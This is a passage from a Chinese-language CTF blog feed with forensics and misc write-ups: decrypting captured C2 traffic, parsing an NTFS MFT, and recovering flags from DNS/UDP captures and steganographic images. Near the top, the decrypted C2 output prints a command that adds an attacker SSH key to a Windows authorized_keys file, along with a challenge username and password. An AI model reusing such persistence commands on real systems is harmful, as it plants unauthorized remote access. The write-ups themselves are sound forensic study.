&quot;ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=&quot;; // 你的密文        string decryptedText = Decrypt(cipherText);        Console.WriteLine(&quot;Decrypted Text: &quot; + decryptedText);    &#125;    public static string Decrypt(string cipherText)    &#123;        string result;        try        &#123;            string key = &quot;VYAemVeO3zUDTL6N62kVA&quot;; // 添加密钥            byte[] array = Convert.FromBase64String(cipherText);            using (Aes aes = Aes.Create())            &#123;                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, new byte[]                &#123;                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83                &#125;);                aes.Key = rfc2898DeriveBytes.GetBytes(32);                aes.IV = rfc2898DeriveBytes.GetBytes(16);                using (MemoryStream memoryStream = new MemoryStream())                &#123;                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))                    &#123;                        cryptoStream.Write(array, 0, array.Length);                    &#125;                    byte[] decryptedBytes = memoryStream.ToArray();                    result = Encoding.UTF8.GetString(decryptedBytes); // 使用UTF-8编码解码明文                &#125;            &#125;        &#125;        catch (Exception ex)        &#123;            Console.WriteLine(ex.Message);            Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);            result = &quot;error&quot;;        &#125;        return result;    &#125;&#125;// Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB&#123;c0mmun1c4710n5 &gt;&gt; C:\Users\svc01\.ssh\authorized_keys</code></pre><p>出来了flag1  后面继续对tcp流5中的内容进行解密 得到flag2</p><pre><code class="c#">zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg// Decrypted Text: cmd;C:\;Username: svc01 Password: Passw0rdCorp5421 2nd flag part: _h45_b33n_r357</code></pre><p>完整flag</p><pre><code>HTB&#123;c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5&#125;</code></pre><h3 id="Pursue-The-Tracks"><a href="#Pursue-The-Tracks" class="headerlink" title="Pursue The Tracks"></a>Pursue The Tracks</h3><pre><code>Luxx, leader of The Phreaks, immerses himself in the depths of his computer, tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation. With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. To get the flag, you need to answer the questions from the docker instance.</code></pre><p>题目告诉我们 如果想要拿到flag  需要回答docker容器里面的问题 </p><p>给到的附件是一个MFT文件 是NTFS文件系统的备份文件 </p><pre><code>MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。</code></pre><p>为了更直接的读取MFT文件中的信息 我们使用下面这个项目  可以将MFT中的信息进行解析  并将结果保存在csv表格文件中</p><p><a href="https://github.com/jschicht/Mft2Csv">Mft2Csv</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131723127.png" alt="image-20240313172337050"></p><p>打开第一个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724670.png" alt="image-20240313172408605"></p><p>使用nc 连接docker容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724852.png" alt="image-20240313172442588"></p><p>第一个问题</p><pre><code>Files are related to two years, which are those? (for example: 1993,1995)</code></pre><p>直接在表格里面看 看到两个文件夹 一个名为2023 一个名为2024 那就是这两个年份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131740311.png" alt="image-20240313174026188"></p><pre><code>2023,2024</code></pre><p>第二个问题</p><pre><code>There are some documents, which is the name of the first file written? (for example: randomname.pdf)</code></pre><p>问的是第一个写入的文件名是  这个直接在表格里面找到第一个出现的文件即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131741366.png" alt="image-20240313174159253"></p><pre><code>Final_Annual_Report.xlsx</code></pre><p>第三个问题</p><pre><code>Which file was deleted? (for example: randomname.pdf)</code></pre><p>问的是哪个文件被删除了 这个其实就是找不同 在表格列出的文件中 可以看到<code>Marketing_Plan.xlsx</code>这个文件 第六列的数字是2  但是其他文件都是1 找到对应列的属性 是<code>HEADER_SequenceNo</code>  我们大概可以理解为是一个状态码 2表示这个文件是删除状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131745378.png" alt="image-20240313174556256"></p><pre><code>Marketing_Plan.xlsx</code></pre><p>第四个问题</p><pre><code>How many of them have been set in Hidden mode? (for example: 43)</code></pre><p>问的是有多少个文件处在被隐藏状态 第15列的属性是<code>SI_FilePermission</code> 表示文件权限 找到<code>credentials.txt</code>  这个文件在第15列的值是<code>hidden</code> 表明这个文件此时是处在隐藏状态  在所有文件中 只有这一个文件在第15列的值是<code>hidden</code> 因此 只有1个文件处在隐藏状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131751419.png" alt="image-20240313175137292"></p><pre><code>1</code></pre><p>第五个问题</p><pre><code>Which is the filename of the important TXT file that was created? (for example: randomname.txt)</code></pre><p>问的是被创建的重要的txt文件格式的文件名是什么</p><p>只有一个txt文件类型的文件  就是上一题的<code>credentials.txt</code></p><pre><code>credentials.txt</code></pre><p>第六个问题</p><pre><code>A file was also copied, which is the new filename? (for example: randomname.pdf)</code></pre><p>问的是被复制的文件的文件名是什么  也是观察文件的属性 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132109266.png" alt="image-20240313210919189"></p><p>注意到这个值 其他文件都是0 那这个属性应该就是代表着被复制过的文件</p><pre><code>Financial_Statement_draft.xlsx</code></pre><p>第七个问题</p><pre><code>Which file was modified after creation? (for example: randomname.pdf)</code></pre><p>问的是哪个文件在创建后被修改 这个就是观察时间即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132114714.png" alt="image-20240313211413625"></p><p>只有<code>Project_Proposal.pdf</code>的时间发生了改变  那就是在第一次写入或者保存之后被修改了</p><pre><code>Project_Proposal.pdf</code></pre><p>第八个问题</p><pre><code>What is the name of the file located at record number 45? (for example: randomname.pdf)</code></pre><p>问的就是文件编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132115001.png" alt="image-20240313211553934"></p><pre><code>Annual_Report.xlsx</code></pre><p>第九个问题</p><pre><code>What is the size of the file located at record number 40? (for example: 1337)</code></pre><p>问的是编号40的文件的文件大小</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132116100.png" alt="image-20240313211641061"></p><pre><code>57344</code></pre><p>答完所有问题之后 成功拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132117686.png" alt="image-20240313211708636"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTBCyberCTF2024&quot;&gt;&lt;a href=&quot;#HTBCyberCTF2024&quot; class=&quot;headerlink&quot; title=&quot;HTBCyberCTF2024&quot;&gt;&lt;/a&gt;HTBCyberCTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics-部分&quot;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2023年中国工业互联网安全大赛决赛-misc</title>
    <link href="http://w3nx1z1.github.io/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/"/>
    <id>http://w3nx1z1.github.io/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/</id>
    <published>2024-03-03T12:36:18.167Z</published>
    <updated>2024-03-03T12:41:55.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年中国工业互联网安全大赛决赛-misc"><a href="#2023年中国工业互联网安全大赛决赛-misc" class="headerlink" title="2023年中国工业互联网安全大赛决赛-misc"></a>2023年中国工业互联网安全大赛决赛-misc</h1><pre><code>刷csdn看到了这个比赛 顺手下了附件也来做一做</code></pre><h2 id="DNS-Query-DNS流量提取数据-二维码"><a href="#DNS-Query-DNS流量提取数据-二维码" class="headerlink" title="DNS_Query(DNS流量提取数据 二维码)"></a>DNS_Query(DNS流量提取数据 二维码)</h2><p>拿到一个dns流量 看到info里面有东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011416656.png" alt="image-20240301141629512"></p><p>但是每两条里面的info都是一样的 那我们先过滤一下</p><pre><code>frame.len == 142</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011417055.png" alt="image-20240301141757969"></p><p>写tshark语句把里面的信息提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011418609.png" alt="image-20240301141844558"></p><pre><code>tshark -r DNS_Query.pcapng -T fields -Y &quot;frame.len == 142&quot; -e &quot;dns.qry.name&quot; | awk &#39;&#123;print substr($0,0,29)&#125;&#39; | tr -d &#39;\n&#39; &gt;data.txt</code></pre><pre><code>-Y 是筛选数据包-e 由上图可以看到我们想要提取的数据是在queries的name字段的awk 对提取出来的文本进行处理 提取从第一个字符开始的连续29个字符 这里我们只需要数字部分tr 进一步处理将每行后面的换行符去掉</code></pre><p>猜测这段字符是二维码 写脚本进行转化</p><pre><code class="python">from PIL import Imagefrom zlib import *MAX = 29pic = Image.new(&quot;RGB&quot;, (MAX, MAX))str1 = &quotquot;i = 0for y in range(0, MAX):    for x in range(0, MAX):        if str1[i] == &#39;1&#39;:            pic.putpixel([x, y], (0, 0, 0))        else:            pic.putpixel([x, y], (255, 255, 255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011422724.png" alt="image-20240301142248689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423480.png" alt="image-20240301142320432"></p><h2 id="gigached-lsb隐写-AES加解密"><a href="#gigached-lsb隐写-AES加解密" class="headerlink" title="gigached(lsb隐写 AES加解密)"></a>gigached(lsb隐写 AES加解密)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423883.png" alt="image-20240301142346826"></p><p>压缩包里面有注释 应该是一段加密逻辑 但是我拿到的附件是已经被解压的了 只能看wp里面的了</p><pre><code class="python">def encrypt(key, source):    source = source.encode()    key = key.encode()    key = SHA256.new(key).digest()    IV = Random.new().read(AES.block_size)     encryptor = AES.new(key, AES.MODE_CBC, IV)    padding = AES.block_size - len(source) % AES.block_size      source += bytes([padding]) * padding      data = IV + encryptor.encrypt(source)      return data</code></pre><p>给的这个文件 先看一下类型 是一个iso media</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011712296.png" alt="image-20240301171240260"></p><p>改个后缀名 使用ffmpeg或者foremost 进行分帧 题目介绍是lsb on movie 那视频文件没法进行lsb隐写 估计是在视频的某几帧里面进行lsb隐写</p><pre><code>foremost gigached     或者ffmpeg -i gigached ./output/outr%04d.png</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011941137.png" alt="image-20240301194149977"></p><p>直接使用stegsolve或者zsteg提取隐藏信息就可以了</p><pre><code>8:dp6UYHfO8:NZhyAEYx8:Js8o30248:l+je3k5k8:aJmsL+Hx8:w43oQ3oz8:XjTT3/LQ8:qF4fuu/w8:MNqZVqiA8:Q3vzixxY8:QYbnuQ==8: the key8: isgYpt38:GvM7X1A13:CoT</code></pre><p>将这个内容写入<code>1.txt</code> 写个脚本处理一下</p><pre><code class="python">with open(&quot;1.txt&quot;, &#39;r+&#39;) as f:    line = f.readlines()    new_lines = []    for i in line:        i = i[2:10:1]        new_lines.append(i)    f.writelines(new_lines)</code></pre><pre><code>dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ== the key isgYpt3GvM7X1A1CoT</code></pre><p>根据前面的加密方式写解密脚本</p><pre><code class="python">from Crypto.Cipher import AESfrom Crypto.Hash import SHA256from Crypto import Randomimport base64def decrypt(key, data):    data = base64.b64decode(data)    key = key.encode()    key = SHA256.new(key).digest()    IV = data[:AES.block_size]    decryptor = AES.new(key, AES.MODE_CBC, IV)    decrypted = decryptor.decrypt(data[AES.block_size:])    padding_length = decrypted[-1]    decrypted = decrypted[:-padding_length]    return decrypted.decode()encrypted_data = &quot;dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ==&quot;key = &quot;gYpt3GvM7X1A1CoT&quot;decrypted_text = decrypt(key, encrypted_data)print(decrypted_text)# flag&#123;d53dbf36-444a-471d-a663-91a9e6f400e0&#125;</code></pre><h2 id="hellofromspace-udp流量提取图片-图片异或"><a href="#hellofromspace-udp流量提取图片-图片异或" class="headerlink" title="hellofromspace(udp流量提取图片 图片异或)"></a>hellofromspace(udp流量提取图片 图片异或)</h2><p>打开流量包 看一下协议分级 基本上全是UDP 那就直接追踪一下UDP流 看到两部分flag 一个在<code>flag_part1.txt</code>中 一个在<code>flag_part2.png</code>中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021615238.png" alt="image-20240302161547156"></p><p>追踪udp流发现只有一个流 第一部分flag可以直接在里面搜出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021623120.png" alt="image-20240302162340041"></p><pre><code>flag&#123;c0ee07da-246d</code></pre><p>将数据形式改为原始数据 在010editor里面保存为新文件 <code>1.png</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021618493.png" alt="image-20240302161829428"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021629554.png" alt="image-20240302162905511"></p><p>看着有点不对劲  很明显是缺少了完整的图片结构 但是末尾也确实有正确的图片尾</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021631430.png" alt="image-20240302163127383"></p><p>猜测是中间的部分出了问题 返回去在看一下 图片头是出现在长度为1189的包中的 后面也有很多长度为1189的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021632497.png" alt="image-20240302163215440"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021633081.png" alt="image-20240302163316025"></p><p>png头是从第12个字节出现的 观察下一个长度为1189的包 看到第10个字节数字加了1 看来是计数的 使用的是16进制计数法 顺序计数 那就不用再单独排序了 考虑到文件尾是出现在长度为289的包 那我们就筛选长度&gt;&#x3D;289的包</p><pre><code>udp &amp;&amp; frame.len &gt;= 289</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021636814.png" alt="image-20240302163643722"></p><p>tshark提一下数据</p><pre><code>tshark -r hello.pcapng -T fields -Y &quot;udp &amp;&amp; frame.len &gt;= 289&quot; -e &quot;data.data&quot; | awk &#39;&#123;print substr($0,23)&#125;&#39; &gt; hex.txt </code></pre><p>再把数据放在010里面转储为png图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021701046.png" alt="image-20240302170117632"></p><p>看起来和题目附件里面的<code>original.png</code>一样 猜测是双图盲水印  但尝试过后发现不是 是两张图片异或 使用stegsolve就可以 先打开一张图片 再点Analyse–Image Combiner</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021706412.png" alt="image-20240302170653378"><br>得到一张图片 隐隐约约看到后半段flag </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021707241.png" alt="image-20240302170757151"></p><p>将其保存下来 找个看的清楚的通道</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021709425.png" alt="image-20240302170937373"></p><h2 id="threepages-苹果png解析bug-lsb隐写-js函数调用"><a href="#threepages-苹果png解析bug-lsb隐写-js函数调用" class="headerlink" title="threepages(苹果png解析bug lsb隐写 js函数调用)"></a>threepages(苹果png解析bug lsb隐写 js函数调用)</h2><p>拿到流量包 看一下http导出 关键的文件就是三个html文件<code>page1.html page2.html page3.html</code>  提取出来看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022123964.png" alt="image-20240302212349935"></p><p>得到key1</p><pre><code>f79accc3ae844981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022044688.png" alt="image-20240302204431462"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022124478.png" alt="image-20240302212413361"></p><p>扫码得到一段话</p><pre><code>Do you know some picture will be displayed differently on different devices?</code></pre><p>指的是在不同设备上显示不同的图片 搜了一下 是苹果png解析bug</p><p><a href="https://moonvy.com/blog/post/2021/%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%AE%BE%E5%A4%87%E4%B8%8A%E6%98%BE%E7%A4%BA%E4%B8%8D%E4%B8%80%E6%A0%B7%E5%86%85%E5%AE%B9%E7%9A%84%E7%A5%9E%E5%A5%87PNG%E5%9B%BE%E7%89%87/">在不同设备上显示不一样内容的神奇图片</a></p><p>找一个识别网站<a href="https://fotoforensics.com/">在线识别</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134056.png" alt="image-20240302213418896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134489.png" alt="image-20240302213429375"></p><p>找个在线网站读一下条形码  <a href="https://online-barcode-reader.inliteresearch.com/default.aspx">在线读条形码</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022137997.png" alt="image-20240302213748954"></p><pre><code>here is your key2: 818facca67289de2</code></pre><p>还提取出来一个<code>p2.png</code>  常规的png图片分析方法  看一下有没有lsb隐写 发现在alpha的全部通道均存在隐藏信息 </p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018849.png" alt="image-20240303201804803"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018879.png" alt="image-20240303201812836"></p><p>选择<code>save bin</code> 将信息提取出来 解base64得到源码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032019146.png" alt="image-20240303201911078"></p><p>我们查看page2.html的内容 发现影响返回值的结果的是<code>processDecrypt()</code>函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032024302.png" alt="image-20240303202438259"></p><p>源码里面有关于这个函数的内容</p><pre><code class="javascript">function processDecrypt()&#123;var r=document.getElementById(&quot;key1&quot;).value,e=document.getElementById(&quot;key2&quot;).value;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>那我们直接将我们得到的key1和key2赋予r和e两个参数即可</p><pre><code class="javascript">function processDecrypt()&#123;var r=&quot;f79accc3ae844981&quot;,e=&quot;818facca67289de2&quot;;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>直接将赋值后的代码替换掉源码里面的部分 替换后将源码的全部复制进控制台 在调用<code>processDecrypt()</code>函数即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032029143.png" alt="image-20240303202958990"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年中国工业互联网安全大赛决赛-misc&quot;&gt;&lt;a href=&quot;#2023年中国工业互联网安全大赛决赛-misc&quot; class=&quot;headerlink&quot; title=&quot;2023年中国工业互联网安全大赛决赛-misc&quot;&gt;&lt;/a&gt;2023年中国工业互联网安全大赛决</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
</feed>
